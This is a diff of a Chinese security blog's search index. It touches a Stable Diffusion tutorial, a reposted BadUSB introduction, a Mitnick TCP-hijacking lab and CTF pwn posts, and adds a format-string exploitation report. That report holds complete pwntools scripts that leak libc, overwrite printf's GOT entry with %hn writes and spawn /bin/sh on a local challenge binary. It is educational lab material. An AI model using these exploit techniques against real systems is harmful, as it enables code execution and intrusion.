@@ -9,7 +9,7 @@
   <entry>
     <title>鼠标右键添加新建md文档</title>
     <url>/posts/feb04467.html</url>
-    <content><![CDATA[<h2 id="鼠标右键添加新建-md文档"><a href="#鼠标右键添加新建-md文档" class="headerlink" title="鼠标右键添加新建.md文档"></a>鼠标右键添加新建.md文档</h2><p>直接上链接：</p>
+    <content><![CDATA[<p>直接上链接：</p>
 <p><a href="%5B(36%E6%9D%A1%E6%B6%88%E6%81%AF">鼠标右键添加新建.md文档（亲测有效）</a> Windows下右键新建.md文件教程（转）_右键新建md文件_MercyDean的博客-CSDN博客](<a href="https://blog.csdn.net/qq_43564374/article/details/109471694">https://blog.csdn.net/qq_43564374/article/details/109471694</a>))</p>
 ]]></content>
       <tags>
@@ -19,7 +19,7 @@
   <entry>
     <title>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</title>
     <url>/posts/30b50265.html</url>
-    <content><![CDATA[<h1 id="BadUSB的前世今生：USB-RUBBER-DUCKY和Teensy-USB"><a href="#BadUSB的前世今生：USB-RUBBER-DUCKY和Teensy-USB" class="headerlink" title="BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB"></a>BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB</h1><p>本文转载自[BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB](<a href="https://cloud.tencent.com/developer/article/1036206">BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)</p>
+    <content><![CDATA[<p>本文转载自[BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB](<a href="https://cloud.tencent.com/developer/article/1036206">BadUSB的前世今生：USB RUBBER DUCKY和Teensy USB - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)</p>
 <p><strong>一、介绍</strong></p>
 <p>前段时间翻译了有关BadUSB的两篇文章《解密BadUSB：世界上最邪恶的USB外设》和《研究人员公布BadUSB攻击测试（exploit）代码》，大家反应强烈，很多人都在打听BadUSB的实现方法，或者从那里可以买到这样的U盘。原本打算本周写一篇分析已公开的BadUSB利用代码，兑现一下诺言，但实在是抽不出时间。在此先给大家介绍一下BadUSB的“老前辈”：USB RUBBER DUCKY和Teensy，满足一下大家的好奇心。USB RUBBER DUCKY和Teensy都可用于实施HID模拟攻击，其中USB RUBBER DUCKY入手简单，傻瓜式操作，但价格不菲啊；而Teensy USB性价比比较高，也可用来制作各种酷炫的DIY。</p>
 <p><strong>二、USB RUBBER DUCKY（USB 橡皮鸭）</strong></p>
@@ -100,9 +100,53 @@
       </tags>
   </entry>
   <entry>
+    <title>AI绘图工具以及使用教程</title>
+    <url>/posts/75b509d1.html</url>
+    <content><![CDATA[<h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
+<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
+<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
+<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
+<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
+<ul>
+<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
+</ul>
+<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
+<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
+<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
+<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
+<ul>
+<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
+<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
+<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
+<li>Sampling method：数据采样方式，没什么大影响</li>
+<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
+<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
+<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
+<li>Batch Count：训练几张图片，串行生成</li>
+<li>Batch Size：一次训练几张图片，并行生成</li>
+<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
+<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
+</ul>
+<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
+<p>下面给一个通用Prompts，用于画二次元少女图的</p>
+<p>Prompt：masterpiece，beat quality，1girl</p>
+<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
+<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
+]]></content>
+      <tags>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF-Pwn1</title>
     <url>/posts/c5e9e263.html</url>
-    <content><![CDATA[<h1 id="CTF-Pwn1"><a href="#CTF-Pwn1" class="headerlink" title="CTF-Pwn1"></a>CTF-Pwn1</h1><ul>
+    <content><![CDATA[<ul>
 <li>首先使用<code>checksec</code>工具进行检查：</li>
 </ul>
 <p><img src="/images/2023-10-08-pwn1/images/checksec.png" alt="checksec"></p>
@@ -163,7 +207,7 @@
   <entry>
     <title>MITNICK攻击实验</title>
     <url>/posts/7fdadce9.html</url>
-    <content><![CDATA[<h1 id="MITNICK攻击实验"><a href="#MITNICK攻击实验" class="headerlink" title="MITNICK攻击实验"></a>MITNICK攻击实验</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>KEVIN·MITNICK可能是美国最著名的黑客之一，他在联邦调查局的通缉犯名单上。在逃亡期间，他开始对破解移动网络产生了兴趣，并需要专门的软件来帮助他做到这一点。这让他找到了圣地亚哥超级计算机中心的研究员TSUTOMU SHIMOMURA，移动电话网络安全方面的主要研究人员之一。他有MITNICK想要的代码。</p>
+    <content><![CDATA[<h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>KEVIN·MITNICK可能是美国最著名的黑客之一，他在联邦调查局的通缉犯名单上。在逃亡期间，他开始对破解移动网络产生了兴趣，并需要专门的软件来帮助他做到这一点。这让他找到了圣地亚哥超级计算机中心的研究员TSUTOMU SHIMOMURA，移动电话网络安全方面的主要研究人员之一。他有MITNICK想要的代码。</p>
 <p>1994年，MITNICK利用TCP协议中的漏洞和SHIMOMURA的两台计算机之间的受信任关系，成功地对SHIMOMURA的计算机发动了一次攻击。这次袭击引发了两人之间的对决，并最终导致了MITNICK的被捕。这场对决后来被演变成书籍和好莱坞电影。这次攻击现在被称为MITNICK攻击，这是一种特殊类型的TCP会话劫持。</p>
 <h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>这个实验的目的是重现经典的MITNICK攻击，这样学生们就可以获得这种攻击的第一手经验。我们将模拟最初在SHIMOMURA电脑上的设置，然后启动MITNICK攻击，在SHIMOMURA的两台电脑之间创建一个伪造的TCP会话。如果攻击成功了，我们应该能够在SHIMOMURA的计算机上运行任何命令</p>
 <h2 id="实验主题"><a href="#实验主题" class="headerlink" title="实验主题"></a>实验主题</h2><ul>
@@ -235,53 +279,64 @@
       </tags>
   </entry>
   <entry>
-    <title>AI绘图工具以及使用教程</title>
-    <url>/posts/75b509d1.html</url>
-    <content><![CDATA[<h1 id="AI绘图工具以及使用教程"><a href="#AI绘图工具以及使用教程" class="headerlink" title="AI绘图工具以及使用教程"></a>AI绘图工具以及使用教程</h1><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
-<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
-<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
-<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
-<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
-<ul>
-<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
+    <title>格式化字符串漏洞实验报告</title>
+    <url>/posts/bb9aef07.html</url>
+    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>格式化字符串漏洞利用</li>
+<li>对64程序与32位程序区别的理解</li>
+<li>覆写got表地址</li>
 </ul>
-<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
-<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
-<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
-<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
-<ul>
-<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
-<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
-<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
-<li>Sampling method：数据采样方式，没什么大影响</li>
-<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
-<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
-<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
-<li>Batch Count：训练几张图片，串行生成</li>
-<li>Batch Size：一次训练几张图片，并行生成</li>
-<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
-<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><ul>
+<li>使用checksec, file, ldd等命令查看程序信息：</li>
 </ul>
-<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
-<p>下面给一个通用Prompts，用于画二次元少女图的</p>
-<p>Prompt：masterpiece，beat quality，1girl</p>
-<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
-<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
+<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF.png" alt="基本信息"></p>
+<p>​		可见程序为64位，启动了DEP保护，动态链接。</p>
+<ul>
+<li>使用patchelf修改libc文件。</li>
+</ul>
+<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/patchelf.png" alt="patchelf"></p>
+<ul>
+<li>使用ida库打开程序，反编译。</li>
+</ul>
+<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/main.png" alt="main"></p>
+<p>​		可以发现<code>printf(buf)</code>代码存在格式化字符串漏洞。</p>
+<ul>
+<li>构造python脚本进行gdb调试：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;%1$p&quot;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x4006AD&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Format String\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>​		<code>%1$p</code>表示输出第一个参数的指针形式输出<img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/gdb.png" alt="gdb"></p>
+<p>​		查看栈中情况，可以发现<code>_libc_stat_main+240</code>地址，计算得到该地址为第26个参数（64位程序需要注意前6个参数会在寄存器中）。因此要泄漏<code>libc</code>地址，可以利用<code>%25$p</code>。</p>
+<ul>
+<li>获取libc基址后，可以获取libc中的<code>system</code>函数地址。然后可以通过修改printf函数got表的方式来使程序在执行<code>printf</code>函数转去执行<code>system</code>函数，并且以输入<code>&quot;/bin/sh&quot;</code>字符串达到执行函数<code>system(&quot;/bin/sh&quot;)</code>的目的。</li>
+<li>由于64位程序中函数地址高位为<code>\x00</code>，因此会导致printf函数输出时截断，所以构造payload时printf函数地址需要放在末尾，然后由于64位地址如果使用<code>%n</code>直接对整体进行修改的话，会造成printf输出字符数目过大，耗时且易崩溃。所以考虑使用<code>%hn</code>来进行两字节的修改。</li>
+<li>构造payload，根据system函数的地址分两次修改。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flag: tmp1 &lt; tmp2时为True</span></span><br><span class="line"><span class="comment"># tmp1: 高两字节， tmp2: 低两字节</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%10$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c%11$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%11$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got, printf_got+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​		发送payload后栈情况：</p>
+<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/payload-gdb.png" alt="payload-gdb"></p>
+<p>​		执行printf函数后，可见printf函数got表地址已被修改为system函数地址，然后输入<code>&quot;/bin/sh&quot;</code>字符串，即可返回shell。</p>
+<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/payload-gdb-1.png" alt="payload-gdb-1"></p>
+<ul>
+<li>最终python脚本如下：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取read函数在libc中偏移</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏libc地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;%25$p&#x27;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *0x4006AD&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Format String\n&quot;</span>, payload)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x20840</span>  <span class="comment"># 0x20840</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + system_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line">tmp = <span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">tmp1 = tmp[<span class="number">6</span>:<span class="number">10</span>]</span><br><span class="line">tmp2 = tmp[<span class="number">10</span>:<span class="number">14</span>]</span><br><span class="line">tmp1 = <span class="built_in">int</span>(tmp1, <span class="number">16</span>)</span><br><span class="line">tmp2 = <span class="built_in">int</span>(tmp2, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> tmp1 &gt; tmp2:</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    tmp1 = tmp1 - tmp2</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    tmp2 = tmp2 - tmp1</span><br><span class="line"><span class="built_in">print</span>(tmp1)</span><br><span class="line"><span class="built_in">print</span>(tmp2)</span><br><span class="line">tmp1 = <span class="built_in">str</span>(tmp1)</span><br><span class="line">tmp2 = <span class="built_in">str</span>(tmp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改got表</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(printf_got)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%10$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c%11$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%11$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got, printf_got+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送&quot;/bin/sh&quot;字符串</span></span><br><span class="line">payload = flat(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/result.png" alt="result"></p>
 ]]></content>
       <tags>
-        <tag>教程</tag>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+        <tag>格式化字符串</tag>
       </tags>
   </entry>
   <entry>
     <title>1stStep</title>
     <url>/posts/d053c6e6.html</url>
-    <content><![CDATA[<h3 id="1stStep"><a href="#1stStep" class="headerlink" title="1stStep"></a>1stStep</h3><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul>
+    <content><![CDATA[<h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul>
 <li>ida、ROPgadget工具的使用</li>
 <li>多次栈溢出攻击的原理的理解</li>
 <li>对汇编语言的理解</li>
@@ -369,64 +424,9 @@
       </tags>
   </entry>
   <entry>
-    <title>格式化字符串漏洞实验报告</title>
-    <url>/posts/bb9aef07.html</url>
-    <content><![CDATA[<h1 id="格式化字符串漏洞实验报告"><a href="#格式化字符串漏洞实验报告" class="headerlink" title="格式化字符串漏洞实验报告"></a>格式化字符串漏洞实验报告</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
-<li>格式化字符串漏洞利用</li>
-<li>对64程序与32位程序区别的理解</li>
-<li>覆写got表地址</li>
-</ul>
-<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><ul>
-<li>使用checksec, file, ldd等命令查看程序信息：</li>
-</ul>
-<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF.png" alt="基本信息"></p>
-<p>​		可见程序为64位，启动了DEP保护，动态链接。</p>
-<ul>
-<li>使用patchelf修改libc文件。</li>
-</ul>
-<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/patchelf.png" alt="patchelf"></p>
-<ul>
-<li>使用ida库打开程序，反编译。</li>
-</ul>
-<p><img src="/images/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/main.png" alt="main"></p>
-<p>​		可以发现<code>printf(buf)</code>代码存在格式化字符串漏洞。</p>
-<ul>
-<li>构造python脚本进行gdb调试：</li>
-</ul>
